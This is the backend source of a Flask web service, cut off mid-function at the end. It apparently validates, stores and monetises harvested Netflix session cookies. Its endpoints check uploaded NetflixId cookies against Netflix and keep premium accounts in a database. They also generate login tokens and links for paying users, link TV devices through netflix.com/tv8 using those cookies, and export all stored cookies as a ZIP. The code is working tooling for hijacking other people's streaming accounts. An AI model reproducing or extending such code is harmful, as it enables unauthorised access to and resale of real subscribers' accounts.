    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add('Access-Control-Max-Age', '86400')
        return response, 204
        
    try:
        data = request.get_json()
        email = data.get('email')
        password = data.get('password')
        
        if not email or not password:
            return jsonify({'status': 'error', 'message': 'Email and password required'})
        
        auth_response = supabase.auth.sign_in_with_password({
            "email": email,
            "password": password
        })
        
        profile = supabase.table('user_profiles').select('*').eq('id', auth_response.user.id).single().execute()
        
        is_admin = (email in SUPER_ADMIN_EMAILS or 
                   str(auth_response.user.id) in SUPER_ADMIN_IDS or
                   profile.data.get('is_super_admin', False))
        
        if is_admin and not profile.data.get('is_super_admin', False):
            supabase.table('user_profiles').update({
                'is_super_admin': True,
                'role': 'super_admin'
            }).eq('id', auth_response.user.id).execute()
        
        return jsonify({
            'status': 'success',
            'session': {
                'access_token': auth_response.session.access_token,
                'refresh_token': auth_response.session.refresh_token,
                'expires_at': auth_response.session.expires_at
            },
            'user': {
                'id': auth_response.user.id,
                'email': auth_response.user.email,
                'is_premium': profile.data.get('is_premium', False),
                'is_super_admin': is_admin,
                'role': 'super_admin' if is_admin else profile.data.get('role', 'user')
            }
        })
    except AuthApiError as e:
        return jsonify({'status': 'error', 'message': 'Invalid credentials'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/api/auth/logout', methods=['POST', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_auth
def logout(user):
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add('Access-Control-Max-Age', '86400')
        return response, 204
        
    try:
        supabase.auth.sign_out()
        return jsonify({'status': 'success', 'message': 'Logged out successfully'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/api/auth/me', methods=['GET', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_auth
def get_current_user(user):
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add('Access-Control-Max-Age', '86400')
        return response, 204
        
    try:
        profile = supabase.table('user_profiles').select('*').eq('id', user.id).single().execute()
        return jsonify({
            'status': 'success',
            'user': {
                'id': user.id,
                'email': user.email,
                'is_premium': profile.data.get('is_premium', False) if profile.data else False
            }
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/api/export/netflix-ids', methods=['GET', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_super_admin
def export_netflix_ids(user):
    if request.method == 'OPTIONS':
        return '', 204

    try:
        all_ids = []
        limit = 1000
        offset = 0

        while True:
            result = supabase.table('netflix_accounts')\
                .select('netflix_id')\
                .eq('is_active', True)\
                .limit(limit)\
                .offset(offset)\
                .execute()

            batch = [acc['netflix_id'] for acc in (result.data or []) if acc.get('netflix_id')]
            all_ids.extend(batch)

            if len(batch) < limit:
                break

            offset += limit

        if not all_ids:
            return jsonify({"status": "error", "message": "No active accounts found"}), 404

        # Create ZIP file with one txt per NetflixId
        memory_file = io.BytesIO()
        with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as zf:
            for idx, netflix_id in enumerate(all_ids, 1):
                content = f"NetflixId={netflix_id}\n"
                filename = f"NetflixId_{idx:04d}.txt"
                zf.writestr(filename, content)

        memory_file.seek(0)

        response = Response(memory_file.getvalue(), mimetype='application/zip')
        response.headers['Content-Disposition'] = 'attachment; filename=netflix_ids_to_recheck.zip'
        response.headers['Content-Length'] = str(len(memory_file.getvalue()))
        return response

    except Exception as e:
        logger.error(f"Export ZIP error: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return jsonify({"status": "error", "message": str(e)}), 500
        
@app.route('/api/check', methods=['POST', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_auth
def check_cookie(user):
    if request.method == 'OPTIONS':
        return '', 204
    
    data, errors = validate_input(request.get_json())
    if errors:
        return jsonify({'status': 'error', 'message': 'Invalid input', 'errors': errors}), 400
        
    try:
        content = data.get('content', '')
        mode = data.get('mode', 'check_only')
        
        if not content:
            return jsonify({'status': 'error', 'message': 'No content provided'})
        
        netflix_id = extract_netflix_id(content)
        if not netflix_id:
            return jsonify({'status': 'error', 'message': 'No NetflixId found'})
        
        account_info = check_netflix_cookie({"NetflixId": netflix_id})
        
        if not account_info["ok"]:
            return jsonify({
                "status": "error",
                "message": account_info.get('err', 'Invalid account')
            })
        
        is_premium_user = check_premium_status(user.id)
        is_admin = is_super_admin(user.id)
        
        is_ph_premium = (account_info["country"] == "PH" and 
                        account_info["premium"] and 
                        "Premium" in account_info.get("plan", ""))
        
        account_db_id = None
        if account_info["ok"] and account_info["premium"]:
            can_be_exclusive = is_admin and is_ph_premium
            
            success, db_record = store_netflix_account(
                email=account_info["email"],
                netflix_id=netflix_id,
                subscription_type=account_info["subscription_type"],
                country=account_info["country"],
                plan=account_info["plan"],
                cookie_content=content,
                user_id=user.id,
                signup_country=account_info.get("signup_country"),
                detection_method=account_info.get("detection_method"),
                is_exclusive=can_be_exclusive if 'can_be_exclusive' in locals() else False,
                reserved_for_admin=can_be_exclusive if 'can_be_exclusive' in locals() else False,
                next_billing_date=account_info.get('next_billing_date'),
                days_until_billing=account_info.get('days_until_billing'),
                is_expired=account_info.get('is_expired', False)
            )
            if success and db_record:
                account_db_id = db_record.get('id')
        
        if mode == 'generate_token' and not is_premium_user:
            return jsonify({
                "status": "error",
                "message": "Premium subscription required to generate tokens"
            }), 403
        
        if mode == 'check_only':
            if account_db_id:
                log_token_generation(
                    account_id=account_db_id,
                    user_id=user.id,
                    ip_address=request.remote_addr,
                    token=None
                )
            
            return jsonify({
                "status": "success",
                "data": {
                    "email": account_info["email"],
                    "country": account_info["country"],
                    "plan": account_info["plan"],
                    "is_premium": account_info["premium"],
                    "subscription_type": account_info["subscription_type"],
                    "mode": "check_only",
                    "stored_in_db": account_info["ok"] and account_info["premium"],
                    "is_exclusive": is_ph_premium and not is_admin
                }
            })
        
        token_result = generate_token(netflix_id)
        
        if token_result["status"] != "Success":
            return jsonify({
                "status": "error",
                "message": "Failed to generate token"
            })
        
        if account_db_id:
            log_token_generation(
                account_id=account_db_id,
                user_id=user.id,
                ip_address=request.remote_addr,
                token=token_result["token"]
            )
        
        return jsonify({
            "status": "success",
            "data": {
                "email": account_info["email"],
                "country": account_info["country"],
                "plan": account_info["plan"],
                "is_premium": account_info["premium"],
                "subscription_type": account_info["subscription_type"],
                "token": token_result["token"],
                "expires": token_result["expires"],
                "login_urls": token_result["login_urls"],
                "mode": "generate_token"
            }
        })
            
    except Exception as e:
        logger.error(f"Error in check_cookie: {str(e)}")
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/batch-check', methods=['POST', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_auth
def batch_check(user):
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add('Access-Control-Max-Age', '86400')
        return response, 204
        
    temp_dirs = []
    
    try:
        files = request.files.getlist('files')
        mode = request.form.get('mode', 'check_only')
        
        if not files:
            return jsonify({'status': 'error', 'message': 'No files provided'}), 400
        
        is_premium_user = check_premium_status(user.id)
        
        if mode == 'generate_token' and not is_premium_user:
            return jsonify({
                "status": "error",
                "message": "Premium subscription required to generate tokens"
            }), 403
        
        results = []
        total_files = len(files)
        
        def generate_progress():
            nonlocal results
            
            for index, file in enumerate(files, 1):
                filename = file.filename
                progress_data = {
                    'type': 'progress',
                    'current': index,
                    'total': total_files,
                    'filename': filename,
                    'percent': int((index / total_files) * 100)
                }
                yield f"data: {json.dumps(progress_data)}\n\n"
                
                result = process_single_file(file, mode, is_premium_user, user.id)
                results.append(result)
                
                result_data = {
                    'type': 'result',
                    'result': result,
                    'current': index,
                    'total': total_files
                }
                yield f"data: {json.dumps(result_data)}\n\n"
            
            completion_data = {
                'type': 'complete',
                'results': results,
                'summary': {
                    'total': len(results),
                    'valid': len([r for r in results if r['status'] == 'success']),
                    'invalid': len([r for r in results if r['status'] == 'error'])
                }
            }
            yield f"data: {json.dumps(completion_data)}\n\n"
        
        if request.headers.get('Accept') == 'application/json':
            for file in files:
                result = process_single_file(file, mode, is_premium_user, user.id)
                results.append(result)
            
            return jsonify({
                "status": "success",
                "results": results
            })
        
        return Response(
            stream_with_context(generate_progress()),
            mimetype='text/event-stream',
            headers={
                'Cache-Control': 'no-cache',
                'X-Accel-Buffering': 'no'
            }
        )
        
    except Exception as e:
        logger.error(f"Batch check error: {str(e)}")
        import traceback
        logger.error(traceback.format_exc())
        return jsonify({"status": "error", "message": str(e)}), 500
    
    finally:
        for temp_dir in temp_dirs:
            try:
                shutil.rmtree(temp_dir)
            except:
                pass

def process_single_file(file, mode, is_premium_user, user_id):
    filename = file.filename
    
    try:
        if filename.lower().endswith('.zip'):
            unique_dir = tempfile.mkdtemp(prefix=f"batch_", dir=TEMP_DIR)
            zip_path = os.path.join(unique_dir, filename)
            file.save(zip_path)
            txt_files = extract_zip_and_get_files(zip_path, unique_dir)
            
            if txt_files:
                with open(txt_files[0], 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                return process_content(content, os.path.basename(txt_files[0]), mode, is_premium_user, user_id)
            else:
                return {
                    "status": "error", 
                    "filename": filename, 
                    "message": "No text files found in ZIP"
                }
        
        elif filename.lower().endswith('.txt'):
            content = file.read().decode('utf-8', errors='ignore')
            return process_content(content, filename, mode, is_premium_user, user_id)
        
        else:
            return {
                "status": "error", 
                "filename": filename, 
                "message": "Unsupported file type"
            }
            
    except Exception as e:
        return {
            "status": "error", 
            "filename": filename, 
            "message": str(e)
        }

def process_content(content, filename, mode, is_premium_user, user_id):
    netflix_id = extract_netflix_id(content)
    
    if not netflix_id:
        return {
            "status": "error", 
            "filename": filename, 
            "message": "No NetflixId found"
        }
    
    account_info = check_netflix_cookie({"NetflixId": netflix_id})
    
    if not account_info["ok"]:
        return {
            "status": "error", 
            "filename": filename, 
            "message": account_info.get('err', 'Invalid account')
        }
    
    if account_info["ok"] and account_info.get("premium"):
        store_netflix_account(
            email=account_info["email"],
            netflix_id=netflix_id,
            subscription_type=account_info["subscription_type"],
            country=account_info["country"],
            plan=account_info["plan"],
            cookie_content=content,
            user_id=user_id,
            signup_country=account_info.get("signup_country"),
            detection_method=account_info.get("detection_method"),
            next_billing_date=account_info.get("next_billing_date"),
            days_until_billing=account_info.get("days_until_billing"),
            is_expired=account_info.get("is_expired", False)
        )
    
    result_data = {
        "status": "success",
        "filename": filename,
        "email": account_info["email"],
        "country": account_info["country"],
        "plan": account_info["plan"],
        "is_premium": account_info["premium"],
        "subscription_type": account_info["subscription_type"],
        "mode": mode,
        "stored_in_db": account_info["ok"] and account_info["premium"]
    }
    
    if mode == 'generate_token' and is_premium_user:
        token_result = generate_token(netflix_id)
        if token_result["status"] == "Success":
            result_data["token"] = token_result["token"]
            result_data["expires"] = token_result["expires"]
            result_data["login_urls"] = token_result["login_urls"]
        else:
            result_data["token_error"] = token_result.get("error", "Failed")
    
    return result_data

@app.route('/api/accounts', methods=['GET', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_auth
def get_accounts(user):
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add('Access-Control-Max-Age', '86400')
        return response, 204
        
    try:
        is_premium = check_premium_status(user.id)
        is_admin = is_super_admin(user.id)
        
        logger.info(f"User {user.id} accessing accounts. Premium: {is_premium}, Admin: {is_admin}")
        
        if not is_premium and not is_admin:
            return jsonify({
                "status": "error",
                "message": "Premium subscription required to view accounts"
            }), 403
        
        # SAME FILTER FOR EVERYONE: only active, premium, non-expired accounts
        query = supabase.table('netflix_accounts')\
            .select('*')\
            .eq('is_active', True)\
            .eq('is_premium', True)\
            .eq('is_expired', False)\
        
        country_filter = request.args.get('country')
        if country_filter:
            query = query.eq('country', country_filter)
        
        query = query.order('created_at', desc=True)
        accounts = query.execute()
        
        if is_admin:
            ph_count = ensure_ph_accounts_pool()
            logger.info(f"Super admin {user.id} accessed accounts. PH pool: {ph_count}")
        
        safe_accounts = []
        for acc in accounts.data or []:
            # Extra safety: skip anything that slipped through with negative billing
            days_left = acc.get('days_until_billing')
            if days_left is not None and days_left < -3:
                continue
            
            account_data = {
                'id': acc['id'],
                'email': acc['email'],
                'subscription_type': acc['subscription_type'],
                'country': acc['country'],
                'plan': acc['plan'],
                'created_at': acc['created_at'],
                'last_checked': acc['last_checked'],
                'days_until_billing': days_left,
                'next_billing_date': acc.get('next_billing_date')
            }
            
            # Admins see extra metadata (but same filtered accounts)
            if is_admin:
                account_data['is_exclusive'] = acc.get('exclusive_access', False)
                account_data['reserved_for_super_admin'] = acc.get('reserved_for_super_admin', False)
                account_data['is_expired'] = acc.get('is_expired', False)
                account_data['added_by'] = acc.get('added_by')
            
            safe_accounts.append(account_data)
        
        return jsonify({
            "status": "success",
            "accounts": safe_accounts,
            "is_super_admin": is_admin,
            "total_count": len(safe_accounts)
        })
        
    except Exception as e:
        logger.error(f"Error getting accounts: {str(e)}")
        import traceback
        logger.error(traceback.format_exc())
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/accounts/exclusive', methods=['GET', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_super_admin
def get_exclusive_accounts(user):
    """Get accounts reserved for super admin only"""
    if request.method == 'OPTIONS':
        return '', 204
    
    try:
        accounts = supabase.table('netflix_accounts')\
            .select('*')\
            .or_('exclusive_access.eq.true,reserved_for_super_admin.eq.true')\
            .eq('is_active', True)\
            .order('created_at', desc=True)\
            .execute()
        
        ph_accounts = [a for a in (accounts.data or []) if a.get('country') == 'PH']
        other_accounts = [a for a in (accounts.data or []) if a.get('country') != 'PH']
        
        return jsonify({
            "status": "success",
            "ph_accounts": {
                "count": len(ph_accounts),
                "accounts": ph_accounts[:20]
            },
            "other_exclusive": other_accounts[:20],
            "ph_minimum_met": len(ph_accounts) >= 8,
            "is_super_admin": True
        })
        
    except Exception as e:
        logger.error(f"Error getting exclusive accounts: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/accounts/<account_id>/set-exclusive', methods=['POST', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_super_admin
def set_account_exclusive(user, account_id):
    """Mark an account as exclusive/super-admin-only"""
    if request.method == 'OPTIONS':
        return '', 204
    
    try:
        data = request.get_json()
        is_exclusive = data.get('exclusive_access', False)
        reserved_for_admin = data.get('reserved_for_super_admin', False)
        
        result = supabase.table('netflix_accounts')\
            .update({
                'exclusive_access': is_exclusive,
                'reserved_for_super_admin': reserved_for_admin,
                'updated_at': datetime.utcnow().isoformat()
            })\
            .eq('id', account_id)\
            .execute()
        
        if result.data:
            return jsonify({
                "status": "success",
                "message": "Account exclusivity updated",
                "account": result.data[0]
            })
        else:
            return jsonify({"status": "error", "message": "Account not found"}), 404
            
    except Exception as e:
        logger.error(f"Error setting exclusivity: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/accounts/<account_id>/generate-token', methods=['POST', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_auth
def generate_account_token(user, account_id):
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add('Access-Control-Max-Age', '86400')
        return response, 204
        
    try:
        is_premium = check_premium_status(user.id)
        
        if not is_premium:
            return jsonify({
                "status": "error",
                "message": "Premium subscription required"
            }), 403
        
        account = supabase.table('netflix_accounts')\
            .select('*')\
            .eq('id', account_id)\
            .eq('is_active', True)\
            .single()\
            .execute()
        
        if not account.data:
            return jsonify({
                "status": "error",
                "message": "Account not found"
            }), 404
        
        netflix_id = account.data.get('netflix_id')
        
        if not netflix_id:
            return jsonify({
                "status": "error",
                "message": "Invalid account data"
            })
        
        token_result = generate_token(netflix_id)
        
        if token_result["status"] != "Success":
            return jsonify({
                "status": "error",
                "message": "Failed to generate token"
            })
        
        log_token_generation(
            account_id=account_id,
            user_id=user.id,
            ip_address=request.remote_addr
        )
        
        return jsonify({
            "status": "success",
            "data": {
                "email": account.data['email'],
                "subscription_type": account.data['subscription_type'],
                "token": token_result["token"],
                "expires": token_result["expires"],
                "login_urls": token_result["login_urls"]
            }
        })
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/health', methods=['GET'])
def health():
    return jsonify({
        "status": "ok",
        "env_vars_set": {
            "SUPABASE_URL": bool(os.environ.get('SUPABASE_URL')),
            "SUPABASE_SERVICE_KEY": bool(os.environ.get('SUPABASE_SERVICE_KEY')),
            "FLASK_SECRET_KEY": bool(os.environ.get('FLASK_SECRET_KEY'))
        }
    })

@app.route('/api/cron/validate-accounts', methods=['GET', 'POST'])
def cron_validate_accounts():
    cron_secret = os.environ.get('CRON_SECRET')
    auth_header = request.headers.get('Authorization', '')
    
    is_vercel = (
        request.headers.get('User-Agent') == 'Vercel Cron' or
        (cron_secret and auth_header == f"Bearer {cron_secret}") or
        request.headers.get('x-vercel-signature') is not None
    )
    
    if not is_vercel and os.environ.get('VERCEL_ENV') == 'production':
        return jsonify({'status': 'unauthorized'}), 401
    
    try:
        headers = {
            'apikey': SUPABASE_SERVICE_KEY,
            'Authorization': f'Bearer {SUPABASE_SERVICE_KEY}',
            'Content-Type': 'application/json',
            'Prefer': 'return=minimal'
        }
        
        fetch_url = f"{SUPABASE_URL}/rest/v1/netflix_accounts?select=*&is_active=eq.true"
        fetch_resp = requests.get(fetch_url, headers=headers, timeout=30)
        
        if fetch_resp.status_code != 200:
            return jsonify({'status': 'error', 'message': f'Fetch failed: {fetch_resp.status_code}'}), 500
        
        accounts = fetch_resp.json()
        
        if not accounts:
            return jsonify({'status': 'success', 'message': 'No accounts to check', 'checked': 0})
        
        results = {'valid': 0, 'invalid': 0, 'updated': 0, 'errors': []}
        
        for account in accounts:
            try:
                netflix_id = account.get('netflix_id')
                if not netflix_id:
                    continue
                
                account_info = check_netflix_cookie({"NetflixId": netflix_id})
                
                # CRITICAL FIX: Same validation logic as bulk recheck
                is_valid = account_info.get('ok', False)
                error_reason = account_info.get('err', 'Unknown error')
                
                # Safety checks
                if is_valid and (not account_info.get('email') or account_info.get('email') == 'Unknown'):
                    is_valid = False
                    error_reason = 'Incomplete account data'
                
                if is_valid and account_info.get('plan') == 'Unknown' and not account_info.get('premium', False):
                    is_valid = False
                    error_reason = 'Unknown plan, likely expired'
                
                if is_valid:
                    update_data = {
                        'last_checked': datetime.utcnow().isoformat(),
                        'plan': account_info['plan'],
                        'subscription_type': account_info['subscription_type'],
                        'country': account_info['country'],
                        'is_active': True,
                        'is_premium': account_info['premium'],
                        'next_billing_date': account_info.get('next_billing_date'),
                        'days_until_billing': account_info.get('days_until_billing'),
                        'is_expired': False,
                        'deactivated_reason': None,
                        'deactivated_at': None
                    }
                    
                    update_url = f"{SUPABASE_URL}/rest/v1/netflix_accounts?id=eq.{account['id']}"
                    requests.patch(update_url, headers=headers, json=update_data, timeout=30)
                    
                    results['valid'] += 1
                    results['updated'] += 1
                    
                else:
                    update_data = {
                        'is_active': False,
                        'last_checked': datetime.utcnow().isoformat(),
                        'deactivated_reason': error_reason,
                        'deactivated_at': datetime.utcnow().isoformat(),
                        'is_expired': True,
                        'is_premium': False
                    }
                    
                    update_url = f"{SUPABASE_URL}/rest/v1/netflix_accounts?id=eq.{account['id']}"
                    requests.patch(update_url, headers=headers, json=update_data, timeout=30)
                    
                    results['invalid'] += 1
                    
                time.sleep(1.5)
                
            except Exception as e:
                results['errors'].append({'account_id': account['id'], 'error': str(e)})
                logger.error(f"Error checking account {account['id']}: {e}")
                continue
        
        return jsonify({
            'status': 'success',
            'checked': len(accounts),
            'results': results
        })
        
    except Exception as e:
        logger.error(f"Cron job failed: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/admin/bulk-recheck', methods=['POST', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_super_admin
def bulk_recheck_accounts(user):
    """Process accounts in chunks like batch-check, return JSON (not SSE)"""
    if request.method == 'OPTIONS':
        return '', 204

    try:
        headers = {
            'apikey': SUPABASE_SERVICE_KEY,
            'Authorization': f'Bearer {SUPABASE_SERVICE_KEY}',
            'Content-Type': 'application/json',
            'Prefer': 'return=minimal'
        }
        
        data = request.get_json() or {}
        chunk_size = data.get('chunk_size', 15)
        offset = data.get('offset', 0)
        
        fetch_url = f"{SUPABASE_URL}/rest/v1/netflix_accounts?select=*&is_active=eq.true&order=created_at.desc&limit={chunk_size}&offset={offset}"
        fetch_resp = requests.get(fetch_url, headers=headers, timeout=30)
        
        if fetch_resp.status_code != 200:
            return jsonify({'status': 'error', 'message': f'Failed to fetch: {fetch_resp.status_code}'}), 500
        
        accounts = fetch_resp.json()
        
        if not accounts:
            return jsonify({
                'status': 'complete',
                'message': 'No more accounts to process',
                'chunk': [],
                'offset': offset,
                'has_more': False
            })
        
        results = []
        valid_count = 0
        invalid_count = 0
        
        for account in accounts:
            try:
                netflix_id = account.get('netflix_id')
                email = account.get('email', 'Unknown')
                
                if not netflix_id:
                    results.append({
                        'email': email,
                        'status': 'error',
                        'reason': 'Missing NetflixId'
                    })
                    continue

                # Check cookie
                account_info = check_netflix_cookie({"NetflixId": netflix_id})
                
                # CRITICAL FIX: Check both 'ok' AND 'err' keys
                # 'ok' can be False with 'err' explaining why
                is_valid = account_info.get('ok', False)
                error_reason = account_info.get('err', 'Unknown error')
                
                # Additional safety: if ok is True but no email/plan, something is wrong
                if is_valid and (not account_info.get('email') or account_info.get('email') == 'Unknown'):
                    is_valid = False
                    error_reason = 'Incomplete account data (missing email)'
                
                # Additional safety: if ok is True but plan is Unknown and not premium, likely expired
                if is_valid and account_info.get('plan') == 'Unknown' and not account_info.get('premium', False):
                    is_valid = False
                    error_reason = 'Unknown plan, likely expired or invalid'
                
                if is_valid:
                    # Update valid account
                    update_data = {
                        'last_checked': datetime.utcnow().isoformat(),
                        'plan': account_info['plan'],
                        'subscription_type': account_info['subscription_type'],
                        'country': account_info['country'],
                        'is_active': True,
                        'is_premium': account_info['premium'],
                        'next_billing_date': account_info.get('next_billing_date'),
                        'days_until_billing': account_info.get('days_until_billing'),
                        'is_expired': False,
                        'deactivated_reason': None,
                        'deactivated_at': None
                    }
                    
                    update_url = f"{SUPABASE_URL}/rest/v1/netflix_accounts?id=eq.{account['id']}"
                    requests.patch(update_url, headers=headers, json=update_data, timeout=30)
                    
                    valid_count += 1
                    results.append({
                        'email': email,
                        'status': 'valid',
                        'plan': account_info['plan'],
                        'country': account_info['country']
                    })
                    
                else:
                    # Mark as inactive - use the error reason from check_netflix_cookie
                    update_data = {
                        'is_active': False,
                        'last_checked': datetime.utcnow().isoformat(),
                        'deactivated_reason': error_reason,
                        'deactivated_at': datetime.utcnow().isoformat(),
                        'is_expired': True,
                        'is_premium': False
                    }
                    
                    update_url = f"{SUPABASE_URL}/rest/v1/netflix_accounts?id=eq.{account['id']}"
                    requests.patch(update_url, headers=headers, json=update_data, timeout=30)
                    
                    invalid_count += 1
                    results.append({
                        'email': email,
                        'status': 'invalid',
                        'reason': error_reason
                    })

                time.sleep(1.5)

            except Exception as e:
                logger.error(f"Error checking account {account.get('id')}: {e}")
                results.append({
                    'email': account.get('email', 'Unknown'),
                    'status': 'error',
                    'reason': str(e)[:200]
                })
                continue

        next_offset = offset + len(accounts)
        count_resp = requests.get(
            f"{SUPABASE_URL}/rest/v1/netflix_accounts?select=*&is_active=eq.true&limit=1&offset={next_offset}",
            headers=headers, timeout=30
        )
        has_more = len(count_resp.json()) > 0 if count_resp.status_code == 200 else False

        return jsonify({
            'status': 'success',
            'chunk': results,
            'offset': offset,
            'next_offset': next_offset,
            'has_more': has_more,
            'chunk_valid': valid_count,
            'chunk_invalid': invalid_count,
            'message': f'Processed {len(results)} accounts. {valid_count} valid, {invalid_count} invalid.'
        })

    except Exception as e:
        logger.error(f"Bulk recheck failed: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/admin/account-stats', methods=['GET', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_super_admin
def get_account_stats(user):
    """Get quick stats for super admin dashboard"""
    if request.method == 'OPTIONS':
        return '', 204

    try:
        headers = {
            'apikey': SUPABASE_SERVICE_KEY,
            'Authorization': f'Bearer {SUPABASE_SERVICE_KEY}',
            'Content-Type': 'application/json'
        }

        # Total accounts
        total_resp = requests.get(f"{SUPABASE_URL}/rest/v1/netflix_accounts?select=*&limit=1", 
                                  headers={**headers, 'Prefer': 'count=exact'}, timeout=30)
        total = int(total_resp.headers.get('content-range', '0-0/0').split('/')[1]) if '/' in total_resp.headers.get('content-range', '') else 0

        # Active accounts
        active_resp = requests.get(f"{SUPABASE_URL}/rest/v1/netflix_accounts?select=*&is_active=eq.true&limit=1", 
                                   headers={**headers, 'Prefer': 'count=exact'}, timeout=30)
        active = int(active_resp.headers.get('content-range', '0-0/0').split('/')[1]) if '/' in active_resp.headers.get('content-range', '') else 0

        # PH accounts
        ph_resp = requests.get(f"{SUPABASE_URL}/rest/v1/netflix_accounts?select=*&country=eq.PH&is_active=eq.true&limit=1", 
                               headers={**headers, 'Prefer': 'count=exact'}, timeout=30)
        ph_count = int(ph_resp.headers.get('content-range', '0-0/0').split('/')[1]) if '/' in ph_resp.headers.get('content-range', '') else 0

        # Premium accounts
        premium_resp = requests.get(f"{SUPABASE_URL}/rest/v1/netflix_accounts?select=*&is_premium=eq.true&is_active=eq.true&limit=1", 
                                    headers={**headers, 'Prefer': 'count=exact'}, timeout=30)
        premium_count = int(premium_resp.headers.get('content-range', '0-0/0').split('/')[1]) if '/' in premium_resp.headers.get('content-range', '') else 0

        # Accounts needing recheck (not checked in 7 days)
        seven_days_ago = (datetime.utcnow() - timedelta(days=7)).isoformat()
        old_resp = requests.get(
            f"{SUPABASE_URL}/rest/v1/netflix_accounts?select=*&last_checked=lt.{seven_days_ago}&is_active=eq.true&limit=1",
            headers={**headers, 'Prefer': 'count=exact'}, timeout=30)
        needs_recheck = int(old_resp.headers.get('content-range', '0-0/0').split('/')[1]) if '/' in old_resp.headers.get('content-range', '') else 0

        return jsonify({
            'status': 'success',
            'stats': {
                'total': total,
                'active': active,
                'inactive': total - active,
                'ph_accounts': ph_count,
                'premium_accounts': premium_count,
                'needs_recheck': needs_recheck,
                'last_updated': datetime.utcnow().isoformat()
            }
        })

    except Exception as e:
        logger.error(f"Stats error: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return jsonify({'status': 'error', 'message': str(e)}), 500

# End of file - no more function definitions after routes

#--------------------------------------------------------------
@app.route('/api/tv-auth', methods=['POST', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_auth
def tv_auth(user):
    """
    TV Device Authentication Flow:
    1. User gets 8-digit code from TV screen
    2. User inputs code here
    3. We use stored NetflixId to submit code to netflix.com/tv8
    4. TV gets linked automatically
    """
    if request.method == 'OPTIONS':
        return '', 204

    try:
        data = request.get_json()
        code = data.get('code', '').strip()
        custom_netflix_id = data.get('netflix_id', '').strip()

        # Validate code format
        if not code or len(code) != 8 or not code.isdigit():
            return jsonify({
                'status': 'error',
                'message': 'TV code must be exactly 8 digits'
            }), 400

        # STEP 1: Get working NetflixId
        netflix_id = None

        if custom_netflix_id:
            # Validate custom NetflixId first
            is_valid, info = validate_netflix_cookie_quick(custom_netflix_id)
            if not is_valid:
                return jsonify({
                    'status': 'error',
                    'message': f'Invalid NetflixId: {info.get("err", "Unknown error")}'
                }), 400
            netflix_id = custom_netflix_id
        else:
            # Find working stored account for this user
            netflix_id = find_working_account_for_user(user.id)
            if not netflix_id:
                return jsonify({
                    'status': 'error',
                    'message': 'No working Netflix accounts found. Please check a cookie first or provide a NetflixId.'
                }), 400

        # STEP 2: Submit TV code using the NetflixId session
        result = submit_tv_code(netflix_id, code)

        # Log attempt
        log_tv_auth_attempt(user.id, code, result.get('status'), request.remote_addr)

        return jsonify(result)

    except Exception as e:
        logger.error(f"TV auth error: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

def find_working_account_for_user(user_id):
    """Find first working NetflixId from user's stored accounts"""
    try:
        result = supabase.table('netflix_accounts')\
            .select('*')\
            .eq('added_by', str(user_id))\
            .eq('is_active', True)\
            .order('created_at', desc=True)\
            .execute()

        for account in result.data or []:
            netflix_id = account.get('netflix_id')
            if not netflix_id:
                continue

            # Quick validation
            is_valid, _ = validate_netflix_cookie_quick(netflix_id)
            if is_valid:
                return netflix_id
            else:
                # Mark dead account
                supabase.table('netflix_accounts')\
                    .update({'is_active': False})\
                    .eq('id', account['id'])\
                    .execute()

    except Exception as e:
        logger.error(f"Error finding account: {e}")

    return None

def submit_tv_code(netflix_id, code):
    """
    Submit 8-digit TV code to netflix.com/tv8 using existing NetflixId cookie.
    This is the CORE function - no token generation, just code submission.
    """
    session = requests.Session()

    # Set the NetflixId cookie - this is our auth session
    session.cookies.set("NetflixId", netflix_id, domain=".netflix.com", path="/")

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "DNT": "1",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }

    try:
        # Step 1: GET tv8 page to establish session and get form
        logger.info("Loading netflix.com/tv8...")
        resp = session.get("https://www.netflix.com/tv8", headers=headers, timeout=30)

        if resp.status_code != 200:
            return {
                'status': 'error',
                'message': f'Failed to load TV page: HTTP {resp.status_code}'
            }

        # Check if cookie is valid (not redirected to login)
        if 'login' in resp.url.lower() or 'signin' in resp.url.lower():
            return {
                'status': 'error',
                'message': 'NetflixId expired. Please check a new cookie first.'
            }

